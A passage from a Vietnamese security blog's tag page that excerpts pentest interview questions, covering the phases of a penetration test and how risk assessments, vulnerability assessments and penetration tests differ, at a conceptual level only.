...</p></div><footer class=entry-footer><span title='2019-05-24 10:48:44 +0700 +0700'>May 24, 2019</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;minhtuanact</footer><a class=entry-link aria-label="post link to Tổng hợp các câu hỏi phỏng vấn pentest - kiến thức chung (P2)" href=https://minhtuanact.github.io/posts/tong-hop-cac-cau-hoi-phong-van-pentest-kien-thuc-chung-p2/></a></article><article class="post-entry tag-entry"><header class=entry-header><h2 class=entry-hint-parent>Tổng hợp các câu hỏi phỏng vấn pentest - kiến thức chung (P1)</h2></header><div class=entry-content><p>Hỏi: What are the phases of a penetration test? Trả lời: Thông thường, pentest được chia ra làm 6 giai đoạn Sáu giai đoạn này rất quan trọng để lập kế hoạch và thực hiện thành công bài pentest. Đối với pentest thì có rất nhiều mảng pentest như Pentest Website, Pentest Network, Pentest Server. Nhưng nhìn chung thì Pentest có các giai đoạn như sau:
Pre-Engagement Interactions Đây là bước thống nhất các yêu cầu của bên cần pentest và các chiến lược mà bên thực hiện pentest đề ra. Reconnaissance or Open Source Intelligence (OSINT) Gathering Một người pentest sẽ hoạt động trên việc thu thập càng nhiều thông tin mật về tổ chức của bạn và các mục tiêu tiềm năng để khai thác. Tùy thuộc vào mức độ pentest mà người pentest sẽ có mức độ thông tin về tổ chức của bạn để cần khám phá các lỗ hổng và điểm vào trong môi trường của bạn. Threat Modeling & Vulnerability Identification Trong giai đoạn này người thực hiện pentest sẽ xác định mục tiêu tấn công. Bất kỳ thông tin nào được thu thập trong giai đoạn này sẽ được sử dụng để thông báo phương thức tấn công trong quá trình pentest Exploitation Với mô hình về tất cả các lỗ hổng và các điểm truy cập có thể có, người pentest bắt đầu kiểm tra các khai thác được tìm thấy trong mạng, hệ thống hay ứng dụng của bạn. Xác định các mục tiêu có giá trị cao và tránh mọi phát hiện của hacker. Post-Exploitation, Risk Analysis & Recommendations Sau giai đoạn thứ tư hoàn tất, người pentest sẽ ghi lại các phương thức được sử dụng để có quyền truy cập vào thông tin có giá trị của tổ chức của bạn và đề xuất các phương pháp khắc phục các lỗ hổng. Sau khi pentest kết thúc, người pentest nên dọn sạch môi trường, cấu hình lại mọi quyền mà anh ta/cô ta có được để xâm nhập vào môi trường và ngăn chặn truy cập trái phép vào hệ thống. Reporting Báo cáo được coi là khía cạnh quan trọng nhất của một pentester. Đó là nơi bạn sẽ nhận được các đề xuất bằng văn bản và có cơ hội xem xét các phát hiện từ báo cáo với các ethical hacker. Những phát hiện và giải thích chi tiết từ báo cáo sẽ cung cấp cho bạn những hiểu biết và cơ hội để cải thiện khả năng bảo mật của bạn. Báo cáo sẽ cho thấy những lỗ hổng còn tồn tại và các cách khắc phục các vấn đề này đường tìm thấy trong giai đoạn khai thác. Hỏi: What is the difference between a risk assessment, a vulnerability assessment, and a penetration test? Trả lời: Đầu tiên ta sẽ phải tìm hiểu như thế nào là đánh giá rủi ro, đánh giá lỗ hổng và kiểm thử phần mềm là gì. Đánh giá rủi ro – Risk Assessment: Kiểm thử này liên quan đến phân tích các rủi ro bảo mật nhận thấy được. Các rủi ro được phân loại là Low, Medium, High. Loại kiểm thử này đưa ra các khuyến nghị nhằm giảm thiểu các rủi ro. Đánh giá bảo mật bằng cách tấn công vào hệ thống – Penetration testing: Đây là loại kiểm thử mô phỏng cuộc tấn công từ phía một hacker thiếu thiện ý. Kiểm thử bao gồm việc phân tích một hệ thống cụ thể, tìm ra các lỗ hổng tiềm ẩn bằng cách tấn công từ bên ngoài. Rà soát các lỗ hổng tiềm ẩn – Vulnerable Assessment: thực hiện thông qua các phần mềm để tự động scan một hệ thống nhằm phát hiện ra các lỗ hổng dựa trên các signatures đã biết. Vậy sự khác biệt của những thứ này là gì: Vulneraability Assessment: Cố gắng tìm được càng nhiều các lỗ hổng nhất có thể. Penetration Testing (Pentest): Cố gắng phá vỡ an ninh hệ thống. Risk Assessment: Cố gắng tìm ra những rủi ro có thể có. => Cả 3 phương pháp đều có chức năng và cách tiếp cận khác nhau. Chính vì vậy tùy thuộc vào tình trạng an ninh của hệ thống mà người ta lựa chọn phương pháp nào để áp dụng.
...</p></div><footer class=entry-footer><span title='2019-05-23 09:48:22 +0700 +0700'>May 23, 2019</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;minhtuanact</footer><a class=entry-link aria-label="post link to Tổng hợp các câu hỏi phỏng vấn pentest - kiến thức chung (P1)" href=https://minhtuanact.github.io/posts/tong-hop-cac-cau-hoi-phong-van-pentest-kien-thuc-chung-p1/></a></article><footer class=page-footer><nav class=pagination><a class=prev href=https://minhtuanact.github.io/tags/cybersecurity/page/3/>«&nbsp;Prev&nbsp;</a></nav></footer></main><footer class=footer><span>&copy; 2025 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span> ·
Like a locksmith studying the art of keys, I share knowledge to illuminate, not to break. ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>